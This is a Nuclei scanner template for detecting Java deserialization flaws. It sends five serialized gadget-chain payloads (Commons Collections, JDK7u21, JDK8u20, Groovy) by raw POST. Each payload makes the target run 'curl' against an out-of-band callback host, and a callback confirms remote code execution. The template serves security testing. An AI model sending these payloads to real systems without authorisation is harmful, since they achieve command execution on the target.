id: generic-java-deserialization

info:
  name: Java Deserialization Detect
  author: pwnhxl
  severity: high
  reference:
    - https://xz.aliyun.com/t/2514
  tags: generic,java,deserialization,oast

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-java-serialized-object

        {{generate_java_gadget("commons-collections3.1", "curl http://{{interactsh-url}}", "raw")}}

      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-java-serialized-object

        {{generate_java_gadget("commons-collections4.0", "curl http://{{interactsh-url}}", "raw")}}

      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-java-serialized-object

        {{generate_java_gadget("jdk7u21", "curl http://{{interactsh-url}}", "raw")}}

      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-java-serialized-object

        {{generate_java_gadget("jdk8u20", "curl http://{{interactsh-url}}", "raw")}}

      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-java-serialized-object

        {{generate_java_gadget("groovy1", "curl http://{{interactsh-url}}", "raw")}}

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "User-Agent: curl"
